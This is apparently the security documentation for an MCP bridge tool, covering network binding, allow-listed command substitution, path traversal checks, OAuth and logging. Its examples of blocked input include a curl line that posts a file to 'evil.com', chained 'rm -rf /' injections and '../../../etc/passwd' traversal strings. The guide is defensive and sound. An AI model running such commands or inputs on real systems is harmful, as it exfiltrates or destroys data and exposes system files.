# Security Guide

This guide covers the security features and best practices for MCP Foxxy Bridge.

## Overview

MCP Foxxy Bridge implements defense-in-depth security with multiple layers of protection:

- **Network Security**: Localhost-only binding by default
- **Command Substitution Security**: Allow-list based command validation
- **OAuth Authentication**: Secure authentication with PKCE
- **SSL/TLS Verification**: Configurable SSL certificate verification (secure by default)
- **HTTP/2 Support**: Automatic protocol upgrade for improved performance
- **Input Validation**: Comprehensive parameter and argument validation
- **Path Traversal Protection**: Secure file path validation to prevent directory traversal attacks
- **Shell Injection Protection**: Multi-layer protection against command injection
- **Security Headers**: Comprehensive security headers in all HTTP requests

## Network Security

### Default Security Posture

The bridge binds to `127.0.0.1:8080` by default for maximum security:

```json
{
  "bridge": {
    "host": "127.0.0.1",  // Localhost-only access
    "port": 8080          // Standard port
  }
}
```

### External Access Considerations

If you need external access:

1. **Use specific IP binding** instead of `0.0.0.0`:
   ```json
   {
     "bridge": {
       "host": "192.168.1.100",  // Specific internal IP
       "port": 8080
     }
   }
   ```

2. **Implement firewall rules**:
   ```bash
   # Allow only specific IPs
   ufw allow from 192.168.1.0/24 to any port 8080

   # Or use iptables
   iptables -A INPUT -p tcp --dport 8080 -s 192.168.1.0/24 -j ACCEPT
   iptables -A INPUT -p tcp --dport 8080 -j DROP
   ```

3. **Consider reverse proxy** with authentication:
   ```nginx
   location /mcp/ {
       auth_basic "MCP Bridge Access";
       auth_basic_user_file /etc/nginx/.htpasswd;
       proxy_pass http://127.0.0.1:8080/;
   }
   ```

## Command Substitution Security

Command substitution allows dynamic configuration using shell commands like `$(op read secret)`. This feature includes comprehensive security validation.

### Security Model

The security model uses **allow-lists** (not block-lists) for maximum protection:

1. **Command Allow-List**: Only pre-approved commands are allowed
2. **Argument Validation**: Command arguments are validated for safety
3. **Shell Injection Protection**: Shell operators are blocked
4. **Read-Only Enforcement**: Write/delete operations are prevented

### Enabling Command Substitution

Command substitution is **disabled by default**. Enable it explicitly:

**Via Configuration:**
```json
{
  "bridge": {
    "allow_command_substitution": true
  }
}
```

**Via CLI:**
```bash
mcp-foxxy-bridge --bridge-config config.json --allow-command-substitution
```

**Via Environment:**
```bash
export MCP_ALLOW_COMMAND_SUBSTITUTION=true
mcp-foxxy-bridge --bridge-config config.json
```

### Allowed Commands

**Default allowed commands** (read-only operations):
- **System info**: `echo`, `printf`, `env`, `printenv`, `pwd`, `uname`, `date`, `whoami`
- **Secret management**: `op` (1Password), `vault` (HashiCorp Vault)
- **Data processing**: `base64`, `jq`
- **Version control**: `git` (read-only), `gh` (GitHub CLI, read-only)
- **Text processing**: `grep`, `cat`, `head`, `tail`
- **Network**: `curl`, `wget` (read-only)

### Custom Command Lists

**Restrict to specific commands:**
```json
{
  "bridge": {
    "allow_command_substitution": true,
    "allowed_commands": ["op", "vault", "git"]
  }
}
```

**Add additional commands via environment:**
```bash
export MCP_ALLOWED_COMMANDS=mycommand,anothercmd
```

### Command Validation

Each command is validated through multiple security checks:

#### 1. Command Allow-List Check
```bash
# ✅ Allowed
$(op read op://vault/item/credential)
$(git rev-parse HEAD)

# ❌ Blocked - not in allow-list
$(rm -rf /tmp/*)
$(curl -X POST -d @file.txt evil.com)
```

#### 2. Shell Injection Protection
```bash
# ❌ Blocked - shell operators
$(op read secret; rm -rf /)
$(git status && curl evil.com)
$(echo test | base64)

# ✅ Allowed - single commands
$(op read op://vault/secret)
$(git status)
$(base64 file.txt)
```

#### 3. Argument Validation

**Git Commands** - Only read-only operations:
```bash
# ✅ Allowed
$(git status)
$(git log --oneline)
$(git rev-parse HEAD)
$(git diff)

# ❌ Blocked
$(git push)
$(git commit -m "test")
$(git reset --hard)
```

**Vault Commands** - Only read operations:
```bash
# ✅ Allowed
$(vault read secret/data/myapp)
$(vault kv get -field=password secret/db)
$(vault list secret/)

# ❌ Blocked
$(vault write secret/data/test value=123)
$(vault delete secret/data/test)
```

**1Password CLI** - Only read operations:
```bash
# ✅ Allowed
$(op read op://Private/Login/password)
$(op get item "My Login")
$(op list items)

# ❌ Blocked
$(op create item)
$(op edit item uuid --title="New Title")
$(op delete item uuid)
```

### Dangerous Commands Mode

⚠️ **UNSAFE MODE** - For testing only:

```bash
# DANGEROUS: Disables ALL security validation
mcp-foxxy-bridge --bridge-config config.json --allow-dangerous-commands
```

This mode:
- Bypasses all command validation
- Allows any command execution
- Shows prominent security warnings
- Should **NEVER** be used in production

### Security Best Practices

1. **Principle of Least Privilege**: Only enable commands you actually need
2. **Environment Isolation**: Run bridge in isolated environments when using command substitution
3. **Regular Auditing**: Monitor logs for command execution
4. **Secure Credential Storage**: Use proper secret management (1Password, Vault, etc.)
5. **Network Segmentation**: Keep bridge on isolated networks when possible

### Example: Secure Secrets Configuration

```json
{
  "mcpServers": {
    "secure-app": {
      "enabled": true,
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_TOKEN": "$(op read op://Private/GitHub/token)",
        "DATABASE_PASSWORD": "$(vault kv get -field=password secret/myapp/db)",
        "API_ENDPOINT": "${API_ENDPOINT:https://api.github.com}"
      }
    }
  },
  "bridge": {
    "allow_command_substitution": true,
    "allowed_commands": ["op", "vault"],
    "conflictResolution": "namespace"
  }
}
```

## Path Traversal Protection

MCP Foxxy Bridge implements comprehensive path traversal attack prevention for all file operations:

### Security Features

- **Directory Traversal Prevention**: All file paths are validated to prevent `../` attacks
- **Null Byte Injection Protection**: Prevents null byte injection attacks in file paths
- **Path Length Limits**: Enforces maximum path lengths to prevent buffer overflow attacks
- **File Extension Validation**: Configuration files must have approved extensions (`.json`)
- **Base Directory Enforcement**: All paths must be within allowed base directories
- **Absolute Path Resolution**: All paths are resolved to absolute paths for validation

### Protected Operations

The following operations are protected against path traversal attacks:

- **Configuration File Loading**: `--bridge-config` parameter validation
- **Configuration Directory**: `--config-dir` parameter validation
- **Config File Creation**: Automatic config generation uses secure paths
- **OAuth Token Storage**: All token files are written to validated paths

### Implementation Details

```python
# Example: Secure config path validation
try:
    config_path = validate_config_path(user_provided_path, config_base_dir)
except PathTraversalError as e:
    logger.error("Path traversal attack detected: %s", e)
    sys.exit(1)
```

### Attack Vector Prevention

The system prevents these common attack patterns:

- `../../../etc/passwd` - Directory traversal
- `config.json\x00../../../etc/passwd` - Null byte injection
- `/var/log/../../etc/passwd` - Absolute path traversal
- `config/../../../sensitive` - Mixed traversal patterns
- Symlink attacks pointing outside allowed directories
- Long path attacks exceeding system limits

### File Permissions

All configuration files are created with restrictive permissions:

- **Configuration Files**: `0600` (owner read/write only)
- **OAuth Tokens**: `0600` (owner read/write only)
- **Log Files**: `0644` (owner read/write, group/others read only)

## SSL/TLS Security

MCP Foxxy Bridge provides comprehensive SSL/TLS security features for all network connections:

### SSL Certificate Verification

- **Secure by Default**: SSL verification is enabled by default for all HTTPS connections
- **Development Override**: Can be disabled with `"verify_ssl": false` for development environments only
- **Per-Server Configuration**: Each server can have its own SSL verification setting

### HTTP/2 Support

- **Automatic Upgrade**: HTTP/2 is automatically used when available
- **Performance Benefits**: Reduced latency and improved throughput
- **Security Benefits**: Better header compression and multiplexing

### Configuration Examples

**Production (Secure):**
```json
{
  "oauth": {
    "enabled": true,
    "issuer": "https://auth.example.com",
    "verify_ssl": true  // Default: always verify certificates
  }
}
```

**Development (Self-Signed Certificates):**
```json
{
  "oauth": {
    "enabled": true,
    "issuer": "https://dev.local:8443",
    "verify_ssl": false  // ONLY for development - logs warning
  }
}
```

### Security Headers

All HTTP requests include comprehensive security headers:
- `X-Content-Type-Options: nosniff`
- `X-XSS-Protection: 1; mode=block`
- `X-Frame-Options: DENY`
- `Strict-Transport-Security` (when using HTTPS)

### Connection Security

- **Connection Pooling**: Managed connection pools prevent resource exhaustion
- **Timeout Configuration**: All network operations have appropriate timeouts
- **Rate Limiting**: Built-in connection limits prevent abuse
- **Proxy Settings**: Environment proxy settings disabled for security

## OAuth Authentication Security

The bridge implements OAuth 2.0 with PKCE (Proof Key for Code Exchange) for enhanced security.

### OAuth Security Features

- **PKCE Support**: Protects against authorization code interception
- **State Parameter**: Prevents CSRF attacks
- **Secure Token Storage**: Tokens stored in local filesystem with appropriate permissions
- **Dynamic Discovery**: OAuth endpoints discovered from multiple server locations
- **Preflight Validation**: OAuth configuration validated before bridge starts
- **Token Refresh**: Automatic token renewal when possible
- **SSL Verification**: Configurable SSL certificate verification (enabled by default)
- **HTTP/2 Support**: Automatic HTTP/2 usage for better performance and security
- **No Hardcoded Scopes**: Scopes dynamically determined from server requirements
- **Transport Awareness**: Different OAuth handling for SSE vs HTTP streaming

### OAuth Configuration

```json
{
  "mcpServers": {
    "protected-service": {
      "url": "https://mcp.example.com/sse",
      "transport": "sse",
      "oauth": {
        "enabled": true,
        // Issuer auto-discovered from server URL if not specified
        // "issuer": "https://auth.example.com",
        "verify_ssl": true  // Default: enabled for security
      }
    },
    "dev-service": {
      "url": "https://dev.local:8443/sse",
      "transport": "sse",
      "oauth": {
        "enabled": true,
        "issuer": "https://dev-auth.local:9443",  // Manual for dev
        "verify_ssl": false  // ONLY for development with self-signed certificates
      }
    }
  },
  "bridge": {
    "oauth_port": 8090  // Dedicated OAuth callback port
  }
}
```

**⚠️ Important**: Only disable SSL verification (`"verify_ssl": false`) in development environments with self-signed certificates. Never disable it in production.

### OAuth Flow Security

1. **Preflight Check**: OAuth configuration validated before bridge starts
2. **Dynamic Discovery**: Attempts discovery on multiple endpoints
3. **Authorization Request**: Uses PKCE code challenge
4. **User Authentication**: Performed in user's browser
5. **Authorization Code**: Exchanged for tokens using PKCE verifier
6. **Token Storage**: Stored securely in `~/.foxxy-bridge/auth/`
7. **Token Usage**: Applied automatically to MCP server requests
8. **CLI Management**: Secure `login`, `logout`, and `status` commands

## Input Validation

All configuration inputs are validated:

- **JSON Schema Validation**: Configuration structure is validated
- **Type Checking**: All parameters have strict type checking
- **Range Validation**: Numeric values are range-checked
- **Path Validation**: File paths are validated for safety
- **URL Validation**: URLs are validated and sanitized

## Monitoring and Logging

### Security Event Logging

The bridge logs security-relevant events:

```bash
# Command substitution events
INFO: Command substitution enabled for configuration loading
WARNING: Potentially unsafe command blocked: rm -rf /
ERROR: Shell injection attempt detected in command: $(echo test; rm file)

# OAuth events
INFO: OAuth preflight check passed for server 'production'
INFO: Successfully discovered OAuth issuer: https://auth.example.com
INFO: OAuth flow initiated for server 'production'
INFO: OAuth tokens refreshed for server 'staging'
WARNING: OAuth token expired, user re-authentication required
ERROR: OAuth preflight check failed - no issuer found

# Network events
INFO: Bridge server started on 127.0.0.1:8080
WARNING: External connection attempt from 192.168.1.100
```

### Log Analysis

Monitor logs for security events:

```bash
# Monitor for security warnings
tail -f /var/log/mcp-bridge.log | grep -E "(SECURITY|WARNING|ERROR)"

# Check for command substitution usage
grep "Command substitution" /var/log/mcp-bridge.log

# Monitor OAuth events
grep "OAuth" /var/log/mcp-bridge.log
```

## Incident Response

### Security Incident Checklist

1. **Immediate Response**:
   - Stop the bridge service
   - Review recent logs for indicators of compromise
   - Check command substitution usage logs

2. **Investigation**:
   - Analyze configuration files for unauthorized changes
   - Review OAuth token storage for tampering
   - Check network connections and access logs

3. **Remediation**:
   - Revoke and regenerate OAuth tokens if compromised
   - Update configuration with stricter security settings
   - Apply network access controls

4. **Prevention**:
   - Review and restrict command allow-lists
   - Implement additional monitoring
   - Update security configurations

## Security Hardening Checklist

- [ ] Bridge binds to localhost-only (`127.0.0.1`)
- [ ] Command substitution disabled unless specifically needed
- [ ] Custom command allow-lists defined when using command substitution
- [ ] OAuth authentication enabled for sensitive services
- [ ] SSL verification enabled (default) for all OAuth connections
- [ ] HTTP/2 enabled for improved performance and security
- [ ] Firewall rules in place for external access
- [ ] Logging enabled and monitored
- [ ] Regular security updates applied
- [ ] Configuration files have appropriate permissions (`0600`)
- [ ] OAuth token storage secured with restrictive permissions
- [ ] File path validation enabled (prevents directory traversal attacks)
- [ ] Network segmentation implemented where possible
- [ ] SSL certificate warnings reviewed and addressed

## Reporting Security Issues

If you discover security vulnerabilities:

1. **Do not** create public GitHub issues for security problems
2. Contact the maintainers privately via email
3. Provide detailed reproduction steps
4. Allow reasonable time for fixes before public disclosure

Follow responsible disclosure practices to help keep all users secure.
